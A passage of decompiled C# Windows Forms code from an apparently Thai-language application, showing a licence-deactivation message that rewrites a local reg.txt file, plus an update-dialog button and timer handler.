			MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("โปรแกรมตรวจพบว\u0e48าเคร\u0e37\u0e48อง ", Module1.COM_ID), " ได\u0e49เล\u0e34กใช\u0e49งานไปแล\u0e49ว กร\u0e38ณาต\u0e34ดต\u0e48อผ\u0e39\u0e49ด\u0e39แลโปรแกรม")), "ERROR!!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			if (File.Exists(Module1.PathF + "reg.txt"))
			{
				File.Delete(Module1.PathF + "reg.txt");
			}
			StreamWriter streamWriter = new StreamWriter(Module1.PathF + "reg.txt");
			streamWriter.Write("855694122154121566451");
			streamWriter.Close();
			Close();
		}
	}

	private void ButtonItem71_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FormUPDATE_0.ShowDialog();
	}

	private void TimerUPDATE_Tick(object sender, EventArgs e)
	{
		if (MyProject.Forms.FormUPDATE_0.CheckBox1.Checked)
		{
			MyProject.Forms.FormUPDATE_0.ButtonX1_Click(null, null);
			Cursor = Cursors.Default;
		}
		else
		{
			LabelStatus.Text = "IP UPDATE : ป\u0e34ด";
		}
	}
}
